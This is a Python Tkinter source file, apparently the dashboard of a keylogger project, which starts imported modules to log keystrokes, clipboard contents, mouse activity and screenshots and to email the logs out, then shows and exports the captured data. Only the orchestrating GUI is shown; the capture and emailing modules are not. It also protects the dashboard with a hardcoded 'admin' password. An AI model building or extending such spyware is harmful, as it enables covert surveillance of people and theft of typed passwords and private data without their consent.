import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import time
import tkinter as tk
from tkinter import ttk, messagebox
from threading import Thread
from modules import keystroke_logger, clipboard_logger, mouse_tracker, email_sender, screenshot_capture


class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("User Login")
        self.root.geometry("300x150")
        self.root.configure(bg="white")
        self.username_var = tk.StringVar()

        ttk.Label(root, text="Enter Username:").pack(pady=10)
        ttk.Entry(root, textvariable=self.username_var).pack()
        ttk.Button(root, text="Submit", command=self.create_user_folder).pack(pady=10)

    def create_user_folder(self):
        username = self.username_var.get().strip()
        if username == "":
            messagebox.showerror("Error", "Username cannot be empty")
            return

        self.user_folder = os.path.join("logs", username)
        os.makedirs(self.user_folder, exist_ok=True)
        os.makedirs(os.path.join(self.user_folder, "screenshots"), exist_ok=True)
        self.launch_main_window()

    def launch_main_window(self):
        self.root.destroy()
        self.main_window = tk.Tk()
        self.main_window.title("Advanced Keylogger Dashboard")
        self.main_window.geometry("800x600")
        self.main_window.configure(bg="#4B0082")

        # Start/Stop Buttons
        btn_frame = ttk.Frame(self.main_window)
        btn_frame.pack(pady=10)

        self.start_btn = ttk.Button(btn_frame, text="▶ Start Monitoring", command=self.start_monitoring)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        self.stop_btn = ttk.Button(btn_frame, text="■ Stop Monitoring", command=self.stop_monitoring)
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        # Dashboard Button
        ttk.Button(btn_frame, text="📊 Dashboard", command=self.show_dashboard).pack(side=tk.LEFT, padx=5)

        # Tabs
        self.notebook = ttk.Notebook(self.main_window)
        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background="#4B0082", borderwidth=0)
        style.configure("TNotebook.Tab", background="#4B0082", foreground="white", padding=[10, 5])
        style.map("TNotebook.Tab", background=[("selected", "#6A0DAD"), ("active", "#800080")])

        self.keystroke_tab = ttk.Frame(self.notebook)
        self.clipboard_tab = ttk.Frame(self.notebook)
        self.screenshot_tab = ttk.Frame(self.notebook)

        self.notebook.add(self.keystroke_tab, text="Keystrokes")
        self.notebook.add(self.clipboard_tab, text="Clipboard")
        self.notebook.add(self.screenshot_tab, text="Screenshots")
        self.notebook.pack(expand=1, fill="both")

        # Text Areas
        self.keystroke_text = tk.Text(self.keystroke_tab, wrap=tk.WORD)
        self.keystroke_text.pack(expand=True, fill="both")
        self.clipboard_text = tk.Text(self.clipboard_tab, wrap=tk.WORD)
        self.clipboard_text.pack(expand=True, fill="both")
        self.screenshot_text = tk.Text(self.screenshot_tab, wrap=tk.WORD)
        self.screenshot_text.pack(expand=True, fill="both")

        self.monitoring = False
        self.main_window.mainloop()

    def start_monitoring(self):
        self.monitoring = True
        Thread(target=keystroke_logger.start_logger, args=(self.user_folder,), daemon=True).start()
        Thread(target=clipboard_logger.start_logger, args=(self.user_folder,), daemon=True).start()
        Thread(target=mouse_tracker.start_logger, args=(self.user_folder,), daemon=True).start()
        Thread(target=screenshot_capture.start_logger, args=(self.user_folder,), daemon=True).start()
        Thread(target=email_sender.send_logs_via_email, args=(self.user_folder,), daemon=True).start()
        Thread(target=self.update_gui_logs, daemon=True).start()
        messagebox.showinfo("Started", "Monitoring has started.")

    def update_gui_logs(self):
        keystroke_file = os.path.join(self.user_folder, "keystrokes.txt")
        clipboard_file = os.path.join(self.user_folder, "clipboard.txt")
        screenshot_dir = os.path.join(self.user_folder, "screenshots")

        while self.monitoring:
            # Update keystrokes
            if os.path.exists(keystroke_file):
                with open(keystroke_file, "r", encoding="utf-8", errors="ignore") as f:
                    data = f.read()
                    self.keystroke_text.delete("1.0", tk.END)
                    self.keystroke_text.insert(tk.END, data)

            # Update clipboard
            if os.path.exists(clipboard_file):
                with open(clipboard_file, "r", encoding="utf-8", errors="ignore") as f:
                    data = f.read()
                    self.clipboard_text.delete("1.0", tk.END)
                    self.clipboard_text.insert(tk.END, data)

            # Update screenshot list
            if os.path.exists(screenshot_dir):
                screenshots = sorted(os.listdir(screenshot_dir), reverse=True)
                text = "\n".join(screenshots[:10])  # show latest 10 screenshots
                self.screenshot_text.delete("1.0", tk.END)
                self.screenshot_text.insert(tk.END, text)

            time.sleep(3)  # refresh every 3 seconds

    def stop_monitoring(self):
        self.monitoring = False
        messagebox.showinfo("Stopped", "Monitoring has been stopped.")
        os._exit(0)

    def show_dashboard(self):
        def validate():
            if password_entry.get() == "admin":
                dashboard_win.destroy()
                self.show_analytics()
            else:
                messagebox.showerror("Access Denied", "Incorrect Password")

        dashboard_win = tk.Toplevel(self.main_window)
        dashboard_win.title("Dashboard Login")
        dashboard_win.geometry("300x150")

        ttk.Label(dashboard_win, text="Enter Password:").pack(pady=10)
        password_entry = ttk.Entry(dashboard_win, show="*")
        password_entry.pack(pady=5)
        ttk.Button(dashboard_win, text="Submit", command=validate).pack(pady=10)

    def show_analytics(self):
        import csv
        from fpdf import FPDF

        analytics_win = tk.Toplevel(self.main_window)
        analytics_win.title("Dashboard Analytics")
        analytics_win.geometry("600x400")

        # Get keystrokes count
        keystroke_path = os.path.join(self.user_folder, "keystrokes.txt")
        keystroke_count = len(open(keystroke_path, "r", encoding="utf-8", errors="ignore").read()) if os.path.exists(keystroke_path) else 0

        # Get clipboard entry count
        clipboard_path = os.path.join(self.user_folder, "clipboard.txt")
        clipboard_count = len(open(clipboard_path, "r", encoding="utf-8", errors="ignore").readlines()) if os.path.exists(clipboard_path) else 0

        # Get screenshot count
        screenshot_dir = os.path.join(self.user_folder, "screenshots")
        screenshot_count = len(os.listdir(screenshot_dir)) if os.path.exists(screenshot_dir) else 0

        # Get mouse log entry count
        mouse_path = os.path.join(self.user_folder, "mouse_log.txt")
        mouse_count = len(open(mouse_path, "r", encoding="utf-8", errors="ignore").readlines()) if os.path.exists(mouse_path) else 0

        # Display results
        ttk.Label(analytics_win, text=f"📌 Keystrokes Typed: {keystroke_count}").pack(pady=10)
        ttk.Label(analytics_win, text=f"📋 Clipboard Entries: {clipboard_count}").pack(pady=10)
        ttk.Label(analytics_win, text=f"🖼️ Screenshots Captured: {screenshot_count}").pack(pady=10)
        ttk.Label(analytics_win, text=f"🖱️ Mouse Events Recorded: {mouse_count}").pack(pady=10)

        # Export Handlers
        def export_to_csv():
            csv_path = os.path.join(self.user_folder, "analytics_report.csv")
            with open(csv_path, mode="w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Metric", "Count"])
                writer.writerow(["Keystrokes", keystroke_count])
                writer.writerow(["Clipboard Entries", clipboard_count])
                writer.writerow(["Screenshots", screenshot_count])
                writer.writerow(["Mouse Events", mouse_count])
            messagebox.showinfo("Exported", f"CSV file saved at:\n{csv_path}")

        def export_to_pdf():
            pdf = FPDF()
            pdf.add_page()
            pdf.set_font("Arial", size=12)
            pdf.cell(200, 10, txt="Keylogger Analytics Report", ln=True, align="C")
            pdf.ln(10)
            pdf.cell(200, 10, txt=f"Keystrokes Typed: {keystroke_count}", ln=True)
            pdf.cell(200, 10, txt=f"Clipboard Entries: {clipboard_count}", ln=True)
            pdf.cell(200, 10, txt=f"Screenshots Captured: {screenshot_count}", ln=True)
            pdf.cell(200, 10, txt=f"Mouse Events Recorded: {mouse_count}", ln=True)
            pdf_path = os.path.join(self.user_folder, "analytics_report.pdf")
            pdf.output(pdf_path)
            messagebox.showinfo("Exported", f"PDF file saved at:\n{pdf_path}")

        ttk.Button(analytics_win, text="⬇ Export to CSV", command=export_to_csv).pack(pady=5)
        ttk.Button(analytics_win, text="📝 Export to PDF", command=export_to_pdf).pack(pady=5)
        ttk.Button(analytics_win, text="🔙 Back", command=analytics_win.destroy).pack(pady=20)



if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
